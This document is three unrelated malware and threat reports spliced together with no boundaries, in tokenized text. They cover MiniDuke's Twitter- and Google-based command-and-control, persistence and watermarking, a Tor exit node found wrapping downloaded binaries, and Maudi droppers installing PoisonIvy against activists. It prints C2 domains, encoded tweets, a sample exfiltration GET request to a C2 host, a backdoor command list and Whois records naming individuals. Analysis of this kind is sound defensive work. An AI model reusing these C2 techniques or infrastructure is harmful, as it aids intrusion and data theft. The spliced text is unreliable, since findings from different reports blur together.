Decryption SHA1 : SHA1 ( probably modified ) area1 : a 16-byte zone in the malicious file which holds the query string for Google .
area2 : a 128-byte zone in the malicious file which holds the encrypted Twitter link .
This is the case when the malware is started by the dropper .
The malware awaits for the user to interact with the computer and verifies the input from mouse or keyboard in an endless loop .
In the first step , the watermark is applied , as described in the Watermark ↓ section .
After the watermark is applied , the malware re - computes the file 's checksum by using the CheckSumMappedFile ( ) function .
The file is dropped with a name randomly chosen from a list in the % ALLUSERSPROFILE % \ Application Data folder set to automatically start after reboot as described below :  for samples in 2011/2012 : the malware modifies the Shell key in Software\Microsoft\Windows NT\CurrentVersion\Winlogon .
The key holds an environment variable which is set to `` rundll32.exe < path_to_dll > , < export_name > '' .
 for samples collected in 2013 : the malware adds a .lnk
file to the Startup directory , which would execute the dll using rundll32.exe .
If there is already a variant of the malware installed before the copy process , the new malware deletes it and creates another combination of names , as well as a new environment variable or .lnk
file .
In this stage , the malicious binary checks if the image is rundll32 - and therefore if it is run on the system through the .lnk
file set in the Startup folder or if it is run from the environment variable .
Then , a thread is created in which the OpenInputDesktop ( ) function is called in an endless loop with a sleep interval of 5 seconds .
The malware then waits for user interaction by checking input from the mouse or keyboard .
The binary also checks the current date , but only uses the current week of the month , the current month and year .
The sample from 2011 checks for the current date using http : //tycho.usno.navy.mil / cgi- bin / timer.pl The sample from 2012 checks for the current date using http : //www.time- server.org/gettime.php ? country = China The samples compiled in 2013 get the current date from the operating system .
The malware then removes the watermark , decrypts the data section and attempts to access the Twitter and Google accounts .
When either of the sites respond , it interprets the received data and decodes the tweets .
When the tweet is decoded , the malware connects to the command and control server in the message and send information about the infected system .
The malware then awaits for a response from the command and control center , which comes as an encrypted GIF file .
Upon decryption , the malware extracts the embedded payload and runs it .
The payload is often an update .
After the task has completed , the malware stops .
Its execution only lasts until it manages to connect to a Twitter account , then it exits , in order to increase its chances of staying undetected .
However , it still runs for a little while upon every operating system boot .
The analysis we carried inside the lab reveals that the payloads are not persistent on disk .
We presume that they are downloaded from a specific location whenever the system boots up .
When the malware is ran via rundll32.exe upon the first boot , it creates a copy of itself named as tempfile.dat ( in some samples ) and would mark the executable file in order to prevent it from correctly running on other systems .
This watermarking process involves the modification of two already encrypted data areas at the end of the executable file .
The first encrypted area is 0x80 bytes large and holds the encrypted Twitter link .
For samples dated 2011 , this area starts with encrypted ( http : //twitter.com/ < username > ) For samples dated 2012 - 2013 , the area starts with encrypted ( https : //mobile.twitter.com/ < username > ) The switch to mobile.twitter has been done on purpose in order to keep the data traffic to a minimum when a connection with Twitter is made .
Also worth mentioning is the fact that the variants we discovered as dated 2012/2013 are connecting via HTTPS .
The second area is 0x10 bytes long and holds an encrypted string that is used to perform a Google query for samples from 2012/2013 .
Depending on the string and the current date , a second Twitter handle is generated .
The sample dated 2011 does not feature this Google search mechanism .
The data areas do n't start at a specific offset .
In order to find them , the malware iterates them from their end and looks for the first byte that is not zero .
This would be the last byte from the small area ( which is 0x10 bytes large ) .
From here on , it can compute where the larger data area is located in the file .
After the malware has identified the area offsets , it would start encrypting them .
A hash is also computed on specific pieces of system information and will be used in the encryption process .
The malware enumerates every network interface , isolates the first DWORD in the description and writes it to the buffer .
The result is overwritten to the previously collected data .
This behavior is probably triggered by a bug .
The data is padded with zeros in order to achieve a block of 0x40 bytes .
A SHA-1 hash is then computed on these bytes , which is then used to modify the small data area ( area1 ) .
For the large data area ( which is 0x80 bytes long ) , the malware does not use the same hash for encryption .
Instead , it would interchange the first DWORD with the second one in the structure and would re - compute the SHA-1 hash .
After these operations have completed , a new checksum on the file is computed via the CheckSumMappedFile ( ) function .
When the malware is run automatically ( through rundll.exe ) , the watermark is removed .
The malware re - computes the hash based on the information collected from the system and would perform a XOR operation with the keys computed on the data sections as described in the Watermark ↑ section .
When these operations have completed , the sample loaded in memory would not feature the watermark and the data can be decrypted .
In order to deter analysis and avoid identification in automated malware research systems , the malware iterates through processes and looks for potentially dangerous processes listed in the Appendix A : Process Blacklist ↓ section .
If it finds a blacklisted process , the malware modifies the first DWORD in the structure to be hashed in order to ensure that the data can not be correctly decrypted .
As we discussed in the previous paragraphs , we know that the full Twitter link used by this specific sample is located in the second data section .
Upon decryption , the buffer should start with http ( s ) : // ( mobile|m ) twitter.com which means that we could find out the encryption key used for watermarking , as the encryption algorithm is a constant , just like the encrypted data .
We can find all the 16 bytes , since the plain - text is over 16 bytes long .
As soon as we had the key , we could completely decrypt the full link , including the Twitter username .
For the first data section - where the Google hyperlink is stored - cryptanalysis can not be performed as we do n't have a prefix of the encrypted text .
More than that , the length of the encrypted data is exactly the same as the length of the key .
The process starts with removing the watermark , as described in the Removing the Watermark ↑ section .
At this point , we can isolate the data , although it is encrypted .
We proceed then with decrypting the 16-byte section that holds the Google username .
The decryption key is obtained by computing the CRC on the unpacked code .
The code starts at offset 0xC and spans until the beginning of the data section ( which is 0x80 bytes long ) .
Going further , the large area is decrypted with the following algorithm : The result holds the Twitter link with the username .
If the primary Twitter username ca n't be accessed or if there is an error while contacting the C & C server mentioned in the first tweet , the malware will attempt the same operation with the secondary Twitter account .
This secondary account is derived from the Google ID ( which is hardcoded into the sample ) and the current date ( current week ) .
This means that a different ID should come up every week .
The malware gets the current date , but only keeps the week of the month , month and year .
These pieces of data are then concatenated with the decrypted data in the first data section .
A SHA-1 hash is computed on a buffer that has the following structure : Date|GoogleSearchTerm .
The hash is then converted to Base64 and isolates the first N bytes of the buffer , which are determined by : Special characters are then stripped from the resulting string .
Character ' + ' becomes ' a ' , and character ' / ' becomes ' 9 ' .
The malware variant dated 2011 connects to twitter.com , while the variants isolated in 2012/2013 use mobile.twitter.com instead .
Every sample comes hardcoded with a version number in the form of a string .
Every version uses a different Twitter username .
These are the Twitter accounts extracted from samples throughout the years : 2011 ObamaApril Etoursinfo 2012 RuthHarper14 CurtinDiana trulrich zokath 2013 KellyPalmer20 EdithAlbert1 FontenotHoward JennieCartagena LorindaRay1 TinaPena10 The tweets are encoded in the following form : uri ! wp07VkkxYt3Ag / bdbNgi3smPJvX7+HLEw5H6/S0RsmHKtA== After decryption , the tweets would become URLs to update servers .
The buffers are decoded using Base64 , then rotates the output to the right ( ROR ) with a variable number of bytes , and then 0x5A is subtracted .
The encoding is fairly easy by reversing the algorithm .
If there are connectivity issues while accessing Twitter or if no tweets holding a uri ! command are found , the malware falls back to an alternate backup mechanism .
A search query with a series of characters is sent to Google .
The results are then processed until an `` uri ! '' pattern is found .
2011 zZkadfDljFE94fFa 2012 DFJ2dskl2394FDLI 9LidWIdf230DFkdL zZkOERmcrD94fFLa 666wifjDfjalQWLK 2013 lUFujJFDiufLKWPR HkyeiIDKiroLaKYr HJUlredIREYUkLLa lUFEfiHKDroLaKYr HJUlOIDIREYUkLLa lUFEfiHKljfLKWPR Although it has been implemented , this mechanism has not been used in the wild .
A Google search for these sequences did not yield any results .
Most likely , the mechanism has been implemented either for possible victims who had access to Twitter blocked in the firewall or as a failsafe mechanism , should the Twitter accounts get suspended .
Also worth mentioning is the fact that the publication of any technical papers about MiniDuke with mentions to the uri ! command and these unique sequences would also activate this mechanism .
If an infected system is unable to connect to Twitter anymore , it would still be able to call back home , as the Google query would return the C & C address in these technical papers .
Each Twitter username is associated with as many command and control centers as tweets .
The tweets are encoded as described in the Decoding the Tweets ↑ section .
After the C & C address is decoded , the malware concatenates it with index.php or main.htm , default.htm , home.htm etc .
See the Appendix B : Possible channels used for C & C section ↓ .
2011 ObamaApril ↔ http : //afgcall.com / demo / index.php etoursinfo ↔ http : //hottraveljobs.com / forum / docs / info.php 2012 RuthHarper14 ↔ http : //arabooks.ch / events/ trulrich ↔ http : //tsoftonline.com / conf/ zokath ↔ http : //www.tsoftonline.com / engine/ 2013 EdithAlbert11 ↔ http : //tsoftonline.com / views/ FontenotHoward ↔ http : //arabooks.ch / lib/ TinaPena10 ↔ http : //arabooks.ch / srch/ LorindaRay1 ↔ http : //artas.org / engine/ In the case of Twitter usernames JennieCartagena and CurtinDiana , there are no details about the C & Cs , as these accounts had been suspended and no information was cached by Google .
The Twitter accounts and their corresponding messages are listed in the Appendix E : Twitter accounts section↓ , along with their timestamp - the date in which action was taken by the attacking party .
The language of these tweets is particular for non - native English speakers - indefinite articles are missing , but the definite ones are present .
This is a feature particular to a small number of relatively popular languages that are spoken in Indonesia or Middle East .
2011 ObamaApril uri ! wp07VkkxYt3Ag / bdbNgi3smPJvX7+HLEw5H6/S0RsmHKtA== etoursinfo uri ! wp07VkkxYmHJnTtmuxrvY8ST8m6It3LjiYEnZvz4Yl / JezdMPBkw5IiVC1al .
2012 RuthHarper14 I was appointed to a new job , my ID for CV was wrong uri ! wp07VkkxYt3Md / JOnLhzRL2FJv0N9zJnzRNp trulrich uri ! wp07VkkxYmfNkwN2nBmx4ch / Iu2c+GLeyZEDTKU= zokath uri ! wp07VkkxYujRoyJ23DkwZ8mRGx6M9yLeyY8m / Yw48GS / E2k= 2013 EdithAlbert11 Albert , my cousin .
He is working hard .
uri ! wp07VkkxYmfNkwN2nBmx4ch / Iu2c+GJow39HbphL FontenotHoward My native town was ruined by tornado .
uri ! wp07VkkxYt3Md / JOnLhzRL2FJjY8l2It TinaPena10 alas I met new boy uri ! wp07VkkxYt3Md / JOnLhzRL2FJm7Mt7DEWg== LorindaRay1 The weather is good today .
Sunny ! uri ! wp07VkkxYt3Mne5uiDkz4Il / Iw48Ge / EWg== The malware performs a GET request to a server with a Base64-encoded string that , if decoded , reads the following : For 2011 samples : crc32 country_code ComputerName/ % USERDOMAIN % OS major , minor , sp_major , prod_type , architecture ( 32/64bit ) antivirus_list proxy_list version ( the version of the malicious sample ) All values are split with `` | '' .
The entire string is encoded in Base64 .
For 2012/2013 samples : These samples send additional data , such as the system username .
Another significant change is the fact that the malware encodes the text using XOR and a key that results from SHA-1 hashing of the Google identifier .
The resulting buffer is then encoded with Base64 .
This is a practical example of the GET request : ? a = MjIzMTQyMzkzM3xST3xIT01FL0hPTUV8NXwxfDN8MXwwfC18LXwyLjEy & g = MjIzMTQy M. The variables names in the GET requests are randomly - picked .
The second variable holds a CRC modulo 13D455h on the encoded string .
The server responds with a GIF file that holds either a DLL or an EXE file .
After a request is sent to the C2 , the malware receives a file with a .GIF
header .
This is usually a valid image that has appended to it a payload or an update in an encrypted form .
The malware checks for the ' GIF8 ' magic at the beginning of the file and looks for the 0x3b00 word .
If the pattern is found , the malware isolates the next four bytes that actually represent the decryption key , followed by the encrypted payload .
Next , the digital signature is verified and then the payload is decrypted .
If it is a DLL file , it attempts to load it via LoadLibrary ( ) ; if it is an EXE file , it gets written on disk with one of the following names : winupdt.exe , wcsntfy.exe , netmngr.exe , dumpreport.exe , taskhosts.exe , wupdmngr.exe , winhlp.exe , dllhosts.exe , dxdiagupd.exe , dialers.exe , netschd.exe , connwiz.exe , certupdt.exe , repfault.exe , wuapreport.exe , lanmgr.exe .
The file is then executed .
The GIF file is digitally signed with RSA 2048bit .
The signature is located at the end of the GIF file and uses SHA-1 .
This mechanism ensures that the updates are `` legit '' and prevents an outsider from pushing a fake update .
The encryption algorithm for these GIF files is a simple XOR operation with a key that rotates on each step The C & C located at http : //hottraveljobs.com / forum / docs / info.php holds a list that resembles log files .
There are approximately 60 entries which we believe are information about the targets .
Since we know the form of the data sent over to Command and Control centers , we might be able to get the format for the logs .
The format is < CRC > |base64| < size > | < md5 > .
The CRC is a decimal representation , while the < size > field can represent the size of a payload sent to the respective target .
The < md5 > - value may be the MD5 hash of the payload .
Example 25479421 84| 4mBwdmBzEaXtEGJSE10Z4mgVEuNV4mBXECt7 gwtgf7EgGBbaHbAs7B7G7Bt0FnlFk17Z 4hTuk1bZ4Ct EiHEU9wEsIoFLgW7mjh3pjCNLfhEuIHzViHbRJwTrk1cS4G3Z4mFS4GAS4mAt4hTtE1PueGPVeF== |0 |0 24194643 63| EucSE6XtEGASE10Z4mFteGFWE14W4wt7gwt1GVzG7gTrgB4sF Vxegv74 d7 01k1IZ4hTtk1bZ4htbgV7 gcBz5f14 UcBbSj2nWih3vJUA Vdm3ZdhTUdmB Uk1cVdmBT dmcT4GbZ4GBY4mcY4mN= |150948 |c026fbffeed6155b f1 86abedb8681257 If the two fields at the end are really representations for < size > and md5 , then we may have 24 different binary files ( see the Appendix C : Possible MD5 hashes for payloads section ↓ ) .
No files in the list could be found by their corresponding MD5 .
Each sample of the malware comes with a version number hardcoded in the binary .
Different versions are usually linked to a different Twitter account .
The vast number of versions indicates intense activity , but only a limited number of samples are known .
The timestamp is isolated from the sample 's PE header and represents the moment in which the executable file has been linked .
Although it can be usually spoofed , we believe it is real , as we were able to correlate it with the moment we received each of the samples .
2011 2011/06/20 - 0.1 - ObamaApril 2011/10/13 - 2.12 – etoursinfo For the 2011 timeframe , we have two samples .
The one linked with the ObamaApril Twitter handle - malware version 0.1 - appears to be the oldest sample .
The jump to version 2.12 can not be justified , and we believe that there are a number of missing samples , which makes year 2011 one of the most active periods for this family of malware .
However , one could also speculate that the versions do not follow a strict order .
2012 2012/05/14 - 6.66 - trulrich 2012/05/21 - 5.21 - trulrich 2012/05/23 - 6.67 - zokath 2012/06/06 - 6.06 - tonyafordy 2012/09/04 - 0.49 - CurtinDiana 2012/12/26 - 3.13 - RuthHarper14 For year 2012 , there are a number of different versions , although we do n't know if they follow a strict order or not .
For instance , version 3.13 was released in December , while version 5.21 was spotted in May .
It is possible that the servers hosting the samples to have run out of sync .
This would explain why lower versions have shown up in December .
2013 2013/02/12 - 1.05 - TinaPena10 2013/02/20 - 1.10 - LorindaRay1 2013/02/20 - 1.12 - EdithAlbert11 2013/02/20 - 1.13 - FontenotHoward 2013/02/21 - 1.10 - LorindaRay1 2013/02/21 - 1.12 - EdithAlbert11 2013/02/21 - 1.13 - FontenotHoward 2013/02/21 - 1.16 - JennieCartagena 2013/02/26 - 1.20 - KellyPalmer20 The versions released in 2013 follow a much stricter order .
Every subversion of the malware comes with a separate Twitter handle .
Quick math shows that there are at least 20 Twitter accounts that have been used in the attacks throughout 2013 ( or at least until February 26th , the date of the discovery ) .
The first defense mechanism to prevent analysis is the presence of the watermark .
The binary file wo n't properly run on a different machine , since the data inside the malware would be decrypted improperly .
Other techniques to prevent data decryption are present inside the binary :  Running software used for reverse engineering : OllyDbg , IDA , Process Monitor etc .
 Running the binary in virtual machines : VMWare and VirtualBox .
 Breakpoints added to the code or code alteration ( hardware breakpoints need to be used instead ) .
The malware also monitors for signs of user interaction , a common technique used for anti- emulation and anti - automated malware analysis .
Another important aspect for versions in 2012 and 2013 is the fact that the malware does not trigger right after installation , but rather wait for a system restart to execute its main code .
These are the MD5 hashes for the droppers .
The date is collected from the PE file header of the backdoor in the droppers : 1e1b0d16a16cf5c7f3a7c053ce78f515 , 2012 - 03 - 05 b029378966d2694f8abd51f0d6c7822a , 2012 - 06 - 15 53db085a276ebbf5798ba756cac833ea , 2013 - 02 - 22 The loader decodes the information in the .data
section with the UCL algorithm , then passes control to the decrypted code .
This piece of code holds a small loader stub , followed by an executable file which is the backdoor itself .
The stub overwrites the memory image of the original executable file with the backdoor so it is never written on disk .
The malware also creates the following key in the Registry HKCU\Software\Microsoft\ApplicationManager with a value of AppID = < random > ( the value is generated via the GetTickCount ( ) function ) .
Malware then waits in a loop and performs requests to info.leveldelta.com Example : GET /php / text.php ? i = gigogrzf4J74xQdeBqVi6w360xlP2ksrNpY7dxmj Accept : * / * User - Agent : Mozilla/4.0 Host : info.leveldelta.com The base64 value in the request is a 30-byte buffer derived from AppID and GetTickCount ( ) and is always different .
We believe that it is used as an identifier .
If it gets a response from the server , the malware performs a series of validations and execute the received commands .
The responses are sent via POST and contain the identifier from the GET request , followed by the command 's result .
This is the way the malware exfiltrates documents from the target computers .
mv - Moves a file .
Uses MoveFileA api .
cp - Copies a file .
Uses CopyFileA api .
rm - Deletes a file .
Uses DeleteFileA api .
pwd - Gets current dir .
Uses GetCurrentDirectoryA api .
cd - Sets current dir .
Uses SetCurrentDirectoryA api .
rmdir - Removes dir .
Uses RemoveDirectoryA api .
mkdir - Creates a dir .
Uses CreateDirectoryA api .
pskill - Kills process .
Uses OpenProcess , TerminateProcess apis .
exew - Create a process .
Uses CreateProcessA api .
conf - Gets some configuration data , creates a string `` i d : 0x % 08X\char ' host : info.leveldelta.com\ port : % d\ delay : % d\ '' cdt - Change to TEMP dir .
Uses GetTempPathA , SetCurrentDirectoryA APIs .
dev - Returns the list of drives in the system with their type ( fixed , removable , etc ) .
The following strings are used for their types : unk , nrt , rmv , fix , net , cdr , ram , und .
Uses GetLogicalDriveStringsA , GetDriveTypeA apis .
time - Gets the number of hours since the system was started : `` uptime % 5d . % 02dh '' .
Uses GetTickCount api .
info - Gets info about system .
String generated like : `` % d % s\n % s\ % s\ '' using GetCurrentProcessId , GetModuleFileNameA , GetComputerNameA , GetUserNameA apis .
exit - `` exiting ...
'' dir , ls - List files in current dir .
Uses FindFirstFile ( `` * '' ) , FindNextFile apis .
exeu - CreateProcessWithLogonW and reads data from pipe .
ecec - CreateProcessA and read data from pipe .
put - Writes file on disk from internal buffer .
Uses CreateFileA , WriteFile apis .
get - Reads a file in chunks of 0x400 bytes and computes SHA1 on them .
ps , pslist - Gets info about processes and their modules .
Uses EnumProcesses , OpenProcess , EnumProcessModules , GetModuleFileNameExA apis .
We have identified two servers used in the attack ( sample md5/timestamp / server ) : 1e1b0d16a16cf5c7f3a7c053ce78f515 , 2012 - 03 - 05 news.grouptumbler.com/news/feed.php b029378966d2694f8abd51f0d6c7822a , 2012 - 06 - 15 info.leveldelta.com/php/text.php 53db085a276ebbf5798ba756cac833ea , 2013 - 02 - 22 info.leveldelta.com/php/text.php Whois information on news.grouptumbler.com Registrant Contact : Grouptumbler . COM Tim K. Lappin ( ) Fax : 4573 Froe Street Bluefield , WV 24701 Bluefield , WV 24701 US 4573 Froe Street Bluefield , WV 24701 Bluefield , WV 24701 Whois information on info.leveldelta.com Registrant Contact : Abdul Kasim ( ) Fax : 1442 Sokak No 49 Izmir , IZMIR 35432 TR 1442 Sokak No 49 Izmir , IZMIR 35432 TR 626489f8cafacb1b24fe6ecf0db52f23 - The received.gif file , named 3979106736.gif 6bc34809e44c40b61dd29e0a387ee682 - The variant decrypted from the .gif
file Observations : clean code , generated by the compiler and no obfuscation .
The file does not have version information or digital signature .
The malware checks to see if the host computer connects to the Internet through a proxy server .
If set , the malware uses the proxy settings .
Regardless of the connection method , the malware connects to 85.95.236.114:443 using sockets .
It creates an unique identifier ( DWORD size ) , from the socket handle .
Everything is encrypted with XOR and a value of an address on the stack .
It sends the identifier on the opened socket .
It receives 16 bytes from the socket , and creates a MD5 hash on these .
The MD5 hash will be used as key for the AES algorithm .
It receives 16 bytes used for AES encryption as initialization vector .
It receives 4 bytes , it performs a XOR operation with the identifier and allocates memory as follows : malloc ( val XOR user_id ) It receives a number of size bytes , decrypts them with AES and calls the start of the decrypted buffer .
The payload can be used to load new modules .
The received code needs to be completely relocatable as the main piece of malware .
Using this technique , the attackers may introduce malicious code that will never be saved on disk , but rather executed directly from memory .
We could also presume that some payloads have been exclusively delivered via this channel and ca n't be recovered for forensic investigation because they never made it on the disk drive .
Information about 85.95.236.114 Location : Turkey Izmir Inetmar Internet Hizmetleri San .
Tic .
Ltd. Sti ASN : AS49467 INETMAR INETMAR Internet Hizmetleri Autonomous System ( izmir ) ( registered Jun 15 , 2009 ) Contact : person : Deniz Tosun org : ORG - IiHS1-RIPE address : 1370 sok .
NO:42 Yalay Is Merkezi Kat:4/406 address : Montro / Konak / IZMIR Country : TR These are the MD5 checksums of the main components , but not payloads , droppers or PDF files .
After creating and using a new exitmap module , I found downloaded binaries being patched through a Tor exit node in Russia .
Tor is a wonderful tool for protecting the identity of journalists , their sources , and even regular users around the world ; however , anonymity does not guarantee security .
At DerbyCon this year I gave a presentation of my binary patching framework , BDF .
Many binaries are hosted without any transport layer security encryption .
Some binaries are signed to prevent modification , but most are not .
During that presentation , I talked about the MITM patching of binaries during download , and showed how easy it was using BDFProxy .
I also mentioned that similar techniques are probably already in use on the Internet .
I had only circumstantial evidence until recently .
I tested BDFProxy against a number of binaries and update processes , including Microsoft Windows Automatic updates .
The good news is that if an entity is actively patching Windows PE files for Windows Update , the update verification process detects it , and you will receive error code 0×80200053 .
This error code indicates a failed signature verification for the downloaded binary .
Windows Update produces this error code for three root causes : 1 .
The file was truncated during download .
Very possible .
2 .
The file was patched during download .
Improbable .
3 .
MS certificate verification is broken .
Very improbable .
If you Google the error code , the official Microsoft response is troublesome .
The first link will bring you to the official Microsoft Answers website .
Notice that this question has been viewed over 34,000 times .
If you follow the three steps from the official MS answer , two of those steps result in downloading and executing a MS ' Fixit ' solution executable .
If an adversary is currently patching binaries as you download them , these ' Fixit ' executables will also be patched .
Since the user , not the automatic update process , is initiating these downloads , these files are not automatically verified before execution as with Windows Update .
In addition , these files need administrative privileges to execute , and they will execute the payload that was patched into the binary during download with those elevated privileges .
Note : a Windows Home or Enterprise user could configure AppLocker to only run signed binaries .
NSIS provides a form of self - checking that weakly ensures that a binary was not modified after compiling .
It issues the following error when the self - checking fails : Looking at Google Trends , this error message is quite common : Notice the top countries where this search is originating : A user can receive an error code for any of the following three root causes : 1 .
The binary was patched .
Improbable .
2 .
The binary was truncated due to a poor Internet connection .
Very probable .
3 .
An actual error with the install program .
Very improbable .
This combined circumstantial evidence left me wondering if there is an individual or group actively patching binaries on the greater Internet .
To have the best chance of catching modified binaries in transit over the Internet , I needed as many exit points in as many countries as possible .
Using Tor would give me this access , and thus the greatest chance of finding someone conducting this malicious MITM patching activity .
After researching the available tools , I settled on exitmap .
Exitmap is Python - based and allows one to write modules to check exit nodes for various modifications of traffic .
Exitmap is the result of a research project called Spoiled Onions that was completed by both the PriSec group at Karlstad University and SBA Research in Austria .
I wrote a module for exitmap , named patchingCheck.py , and have submitted a pull request to the official GitHub repository .
See the usage example .
Soon after building my module , I let exitmap run .
It did not take long , about an hour , to catch my first malicious exit node .
Details from https : //check.torproject.org / exit - addresses ExitNode 8361A794DFA231D863E109FC9EEEF21F4CF09DDD Published 2014 - 10 - 22 01:06:40 LastStatus 2014 - 10 - 22 02:02:33 ExitAddress 78.24.222.229 2014 - 10 - 22 02:08:01 This exit node was very active .
Upon further inspection , the original binary is wrapped within another binary similar to the technique mentioned in the research from Flex Grobert , et al , titled `` Software Distribution Malware Infection Vector '' ( 2008 ) .
However , these malware authors solved the icon issue noted in the paper by keeping the .rsrc
section intact .
By using a wrapper for the original binary , the malware authors do not invoke the NSIS error and bypass simple self - checking mechanisms .
Out of over 1110 exit nodes on the Tor network , this is the only node that I found patching binaries , although this node attempts to patch just about all the binaries that I tested .
The node only patched uncompressed PE files .
This does not mean that other nodes on the Tor network are not patching binaries ; I may not have caught them , or they may be waiting to patch only a small set of binaries .
Leviathan has notified the Tor Project of the issue .
Companies and developers need to make the conscious decision to host binaries via SSL / TLS , whether or not the binaries are signed .
All people , but especially those in countries hostile to `` Internet freedom , '' as well as those using Tor anywhere , should be wary of downloading binaries hosted in the clear - and all users should have a way of checking hashes and signatures out of band prior to executing the binary .
Maudi is a series of small malwares that share similar configuration and behaviour .
The naming of this family has not been very established , but some samples are detected by some vendors as Maudi or PoisonIvy .
This is partly accurate as Maudi trojans in almost all cases install the well known PoisonIvy remote access trojan .
These malwares are not particularly new - they have been in circulation for a long time , probably going back to at least 2009 .
Still , they provide a backdrop to other attacks that is interesting .
The malware itself is not very complex .
These are small installers that create two files – one library ( typically called msacm32.drv , ntshrui.dll or wdmaud.drv ) in the Windows folder , and a raw PoisonIvy shellcode blob called user.dat , user.db , temp.db or something along those lines .
The installer then spawns explorer.exe , which then automatically loads the malicious library through a mechanism called DLL hijacking aka DLL preloading .
There are innocent libraries with the same names in the Windows System folder , but since the malicious libraries are placed in the Windows folder , they sneak in the queue and Explorer loads them first .
The malicious library then reads and directly calls the PoisonIvy code in user.dat , which establishes an encrypted communication with the configured C & C server .
When communication is established , the attacker has unauthorized access to the computer .
PoisonIvy code blobs are preconfigured in the PoisonIvy builder program to contain information about which Command & Control server to contact , which port to establish connection on , and various other parameters .
The Maudi PoisonIvy droppers contain their own small xor - encoded configuration block which overrides the default settings stored in the PoisonIvy blob .
This usually contains the name of the C & C server , port and what corresponds to the PoisonIvy profile ID .
Example Maudi configuration : Profile ID : xfish C & C : 171088046.gnway.org port : 0x0D84 = 3460 The ID xfish is used in many of these malwares and may be a default value , but there are many others in use .
PoisonIvy uses the Camellia 256-bit block cipher for its encrypted communication .
The password for this communication is usually hardcoded in the malware itself ; the default value used by the builder is `` admin '' .
The passwords used by Maudi droppers vary .
Sometimes the default value is used , other times the password is set to longer strings .
There seems to be an affinity for passwords of length 11 ( 0x0b ) .
A few are shown below .
The interesting bit with these trojans is that practically all of them are digitally signed using self - made test certficates .
These certificates vary somewhat , but most contain the recognizable string `` WWW.CeleWare . NET '' or '' WWW.AeleWare . NET '' in their Organizational Unit ( OU ) section .
The CeleWare strings are default values left by the free code signing tool CeleSign.exe from Yonsm . NET .
Though the tool itself seems innocent enough , many files signed by it are malicious .
There were a number of different such certificates , and it may be that the varying certificates denote different campaigns , projects or other contexts – for example , all samples we have seen signed `` DataBase @ Hotmail.com '' are droppers that install Maudi components signed `` MogolSoft @ Hotmail.com '' or `` SoftSign @ HotMail.com '' .
Though by far most of these malwares use test certificates , not all follow this pattern .
A few are not signed at all , and in two cases we have seen the use of a stolen certificate .
The certificate in question belongs to YNK Japan Inc .
This is the configuration block from one of the YNK - signed Maudi samples .
C & C is p.hannmaill.net , port is 3460 ( 0xD84 ) , and tag is xfish .
These two trojans are configured to connect to p.hannmaill.net and s.hiinet.net , respectively .
These domains appear registered by the same entity ( sofoxman @ gmail.com ) .
Both the domains and the certificate have been connected to targeted attack campaigns before .
By combining certificates and command & control infrastructure we can construct a partial image of this malware operation In this diagram the samples are organized in clusters signed similarly .
What quickly becomes obvious is that most of the samples are connected ; either they use the same certificate , or their certificate cluster is connected with other clusters through common Command & Control servers .
Some clusters ( shown at the lower right and left side ) seem unconnected beyond the fact that they use the same malware .
The Command & Control servers used are in many cases organized through well - known dynamic DNS providers such as 3322.org , zapto.org and so on , but there are also a few seemingly directly registered second level domains .
A full list of these is provided in the appendix .
Local Chinese interests and human rights activists We do not have extensive data on which targets have been exposed to Maudi malware , but we have some examples which give decent hints .
Some Maudi droppers display images , like the ones below : These are classic examples of decoys used in targeted campaigns against activists working for the rights of ethnic minorities within the Chinese borders .
Other decoy documents contain small messages in Chinese ; and Chinese name listings .
This gives the general impression that this family is used mostly against domestic Chinese targets and human rights activists .
Other research has confirmed this impression .
In his 2010 article `` Human Rights and Malware Attacks '' , security researcher Nart Villeneuve documents the use of Maudi as the downloaded payload of spearphishing attacks .
The initial payload in that case was a mail attachment , an exploited PDF file ( readme.pdf , md5 72bdca7dd12ed04b21dfa60c5c2ab6c4 ) which downloaded and decoded an encoded blob ( md5 ec16143a14c091100e7af30de03fce1f ) from the site www.humanright-watch.org , not to be confused with the legitimate Human Rights ' Watch website hrw.org .
The decoded file was a Maudi dropper , self - signed using the name `` soft @ hotmail.com '' , and the dropped component belonged to the `` JinDiQIAO @ hotmail.com '' -signed cluster .
There are hints at other targets as well .
A group of Maudis use domain names and other strings that seem to indicate a focus on a specific region , namely Mongolia .
Mongolia is an interesting country .
It is democratic with a multi - party system , and has a market - driven economy .
It is squeezed between two very powerful nations – Russia to the North and China to the South .
It is also a country rich on geological natural resources .
The initial hints about this targeting are vague .
Some of the Maudi samples are signed using self - signed certificate issued to `` mogolsoft @ hotmail.com '' .
Others use the Command & Control domain `` mol-goverment.com '' .
This domain was registered by a known targeted attack actor , hlemonk @ 163.com , who has registered a string of other malware- connected domains – among others goodmongol.com .
However , when looking more closely , more solid ties to Mongolian targets can be found .
The Maudi domain bodologetee.com ( registered by the email entity mongolianews @ yahoo.com ) can be documented used in other attacks on apparent Mongolian targets .
For example , the malware dropper cc1a806d25982acdb35dd196ab8171bc , a WinRAR SFX executable installed through the use of the Word exploit CVE-2012 - 0158 , contained a PlugX component configured to connect to ppt.bodologetee.com .
This is documented in the Norman Shark blog post `` The Chinese Malware Complexes : PlugX Used against Mongolian Targets '' .
Indirectly , we see that the Maudi infrastructure shares parameters with several well known targeted attack campaigns .
o qwer.wekby.com - domain Three samples connect to qwer.wekby.com , known from the RSA breach in 2011 .
These samples are ( md5 , profile ID ) : 28b5241ca13603636dbf626792231161 , qwerw 6a83dc3f53079e17ecc49cbc0dacc8f5 , qwerw cf45dbdb3718b4b728c2dd894032464b , qwerw The malwares used in the RSA intrusion itself were also PoisonIvy , though used a different dropper mechanism and were signed using a different digital certificate .
o jeno_1980 @ hotmail.com – domain registration Two samples connect to ns2.adultstick.com .
This domain was registered by jeno_1980 @ hotmail.com , an email address also used to register domains used both in the Mirage and Sin Digoo malware campaigns .
7d36ad6aafbf1f9496ccc6ac1a8bb57e , Irqdz 64718689ee3ff695c55ea1ec213434d1 , Irqdz o enbtcd @ yahoo.com.co – domain registration Some Maudi samples connect to windows-liveupdate.com or windowsliveupdatecache.com , domains registered by the entity enbtcd @ yahoo.com.co .
This address has also registered domains used in Briba ( aka c0d0so0 ) malware , which has been used for many targeted attacks .
